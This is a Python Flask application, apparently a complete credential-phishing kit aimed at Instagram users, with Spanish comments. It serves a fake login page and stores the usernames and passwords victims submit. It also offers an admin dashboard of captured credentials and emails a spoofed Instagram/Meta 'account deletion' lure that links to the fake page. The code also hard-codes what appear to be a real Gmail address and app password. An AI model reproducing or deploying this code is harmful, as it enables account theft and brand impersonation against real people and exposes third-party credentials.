import os
import smtplib
import sqlite3
import psycopg2
from flask import Flask, request, jsonify, send_from_directory, render_template, session, redirect, url_for, flash
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from urllib.parse import urlparse

# --- CONFIGURACIÓN ---
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)
# Configuración para Producción (Render) y Desarrollo
app.secret_key = os.environ.get("SECRET_KEY", "dev_secret_key_change_in_production")

# Credenciales SMTP (Usar variables de entorno en Render)
SMTP_SERVER = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", 587))
SMTP_USER = os.environ.get("SMTP_USER", "denis69ks@gmail.com")
SMTP_PASSWORD = os.environ.get("SMTP_PASSWORD", "lwfcomqjwtmxccnz")

# Configuración Base de Datos
DATABASE_URL = os.environ.get("DATABASE_URL")

# --- CAPA DE ABSTRACCIÓN DE BASE DE DATOS ---
def get_db_connection():
    """Conecta a PostgreSQL si existe DATABASE_URL, si no usa SQLite."""
    if DATABASE_URL:
        try:
            conn = psycopg2.connect(DATABASE_URL)
            return conn
        except Exception as e:
            print(f"Error conectando a Postgres: {e}")
            return None
    else:
        # Fallback local a SQLite
        db_path = os.path.join(BASE_DIR, "phishing.db")
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row  # Para acceder por nombre de columna
        return conn

def init_db():
    conn = get_db_connection()
    if not conn:
        print("No se pudo conectar a la BD para inicializar.")
        return

    try:
        cur = conn.cursor()
        if DATABASE_URL:
            # PostgreSQL
            cur.execute("""
                CREATE TABLE IF NOT EXISTS captured (
                    id SERIAL PRIMARY KEY,
                    username TEXT,
                    password TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            """)
        else:
            # SQLite
            cur.execute('''CREATE TABLE IF NOT EXISTS captured
                         (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                          username TEXT, 
                          password TEXT, 
                          timestamp TEXT)''')
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Error inicializando BD: {e}")

# Inicializar DB al arrancar
init_db()

# --- RUTAS PRINCIPALES ---

@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/style.css')
def serve_css():
    return send_from_directory(BASE_DIR, 'style.css')

@app.route('/script.js')
def serve_js():
    return send_from_directory(BASE_DIR, 'script.js')

@app.route('/login-page')
def login_page():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/logo.png')
def serve_logo():
    return send_from_directory(BASE_DIR, 'logo.png')

@app.route('/favicon.ico')
def serve_favicon():
    return send_from_directory(BASE_DIR, 'logo.png')

# --- LOGICA DE PHISHING (Captura) ---

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Timestamp: Para Postgres usamos DEFAULT, para SQLite lo generamos
    timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if username and password:
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            
            if DATABASE_URL:
                # Postgres logic
                cur.execute("INSERT INTO captured (username, password) VALUES (%s, %s)", (username, password))
            else:
                # SQLite logic
                cur.execute("INSERT INTO captured (username, password, timestamp) VALUES (?, ?, ?)",
                          (username, password, timestamp_str))
            
            conn.commit()
            cur.close()
            conn.close()
            
            print(f"DATOS CAPTURADOS: {username}:{password}")
            return jsonify({"status": "success"}), 200
        except Exception as e:
            print(f"Error DB: {e}")
            return jsonify({"status": "error"}), 500
    
    return jsonify({"status": "error"}), 400

# --- FUNCION DE ENVIO DE CORREO (Reutilizable) ---
def send_phishing_email_logic(target_email, username_target):
    try:
        subject = "Lamentamos que solicites la eliminación de tu cuenta de Instagram"
        
        # En Producción, esto DEBE ser la URL de tu app en Render
        # Ejemplo: https://mi-phishing-app.onrender.com/login-page
        app_url = os.environ.get("RENDER_EXTERNAL_URL", request.host_url).rstrip('/')
        link = f"{app_url}/login-page"
        
        html_content = f"""
        <html>
        <body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; margin: 0; padding: 0;">
            <div style="max-width: 600px; margin: 20px auto; background-color: #ffffff; border: 1px solid #dbdbdb; padding: 40px;">
                
                <!-- Header con Texto (Sin Imagenes para evitar errores) -->
                 <div style="text-align: center; margin-bottom: 30px;">
                    <p style="font-family: 'Brush Script MT', 'Segoe Script', 'Grand Hotel', cursive; font-size: 45px; margin: 0; color: #262626; line-height: 1;">Instagram</p>
                </div>

                <div style="text-align: left; color: #262626;">
                    <p style="font-size: 16px;">Hola, <strong>{username_target}</strong>:</p>
                    
                    <p style="font-size: 14px; line-height: 1.5;">
                        Lamentamos que hayas solicitado la eliminación de tu cuenta. Si cambias de opinión, tienes tiempo hasta el mayo 28, 2025 para avisarnos. De lo contrario, se eliminarán tus publicaciones e información.
                    </p>
                    
                    <p style="font-size: 14px; line-height: 1.5; margin-top: 20px;">
                        Si se trata de un error o quieres conservar tu cuenta después de todo, avísanos.
                    </p>
                    
                    <div style="text-align: center; margin-top: 30px;">
                        <a href="{link}" style="background-color: #0095f6; color: white; padding: 10px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 14px;">Conservar cuenta</a>
                    </div>
                    
                    <div style="margin-top: 40px; border-top: 1px solid #dbdbdb; padding-top: 20px; color: #8e8e8e; font-size: 12px; text-align: center;">
                        <p>from Meta</p>
                        <p>Instagram from Meta. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025</p>
                        <p>Este mensaje se ha enviado a <span style="color: #00376b;">{target_email}</span>...</p>
                    </div>
                </div>
            </div>
        </body>
        </html>
        """

        msg = MIMEMultipart()
        msg['From'] = f"Instagram <{SMTP_USER}>"
        msg['To'] = target_email
        msg['Subject'] = subject
        msg.attach(MIMEText(html_content, 'html'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASSWORD)
        server.sendmail(SMTP_USER, target_email, msg.as_string())
        server.quit()
        return True, "Correo enviado"
    except Exception as e:
        return False, str(e)

# --- PANEL DE ADMINISTRACION ---

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        
        # Variables de entorno para credenciales admin (o defaults)
        admin_user = os.environ.get("ADMIN_USER", "admin")
        admin_pass = os.environ.get("ADMIN_PASSWORD", "admin1234")
        
        if user == admin_user and pwd == admin_pass:
            session['admin_logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('admin_login.html', error="Credenciales incorrectas")
    
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def dashboard():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    conn = get_db_connection()
    cur = conn.cursor()
    
    # Select query compatible con ambos
    cur.execute("SELECT * FROM captured ORDER BY id DESC")
    data = cur.fetchall()
    
    cur.close()
    conn.close()
    
    return render_template('dashboard.html', captured_data=data)

@app.route('/admin/send-email', methods=['POST'])
def admin_send_email():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
        
    email = request.form.get('email')
    username = request.form.get('username')
    
    if not username:
        username = email.split('@')[0]
        
    success, msg = send_phishing_email_logic(email, username)
    
    if success:
        flash(f"✅ Correo enviado exitosamente a {email}", "success")
    else:
        flash(f"❌ Error al enviar: {msg}", "error")
        
    return redirect(url_for('dashboard'))

@app.route('/admin/logout')
def logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

if __name__ == '__main__':
    # Configuración dinámica de puerto para Render o local
    port = int(os.environ.get("PORT", 8080))
    # Debug debe estar desactivado en producción
    debug_mode = os.environ.get("FLASK_DEBUG", "False").lower() == "true"
    app.run(host='0.0.0.0', port=port, debug=debug_mode)
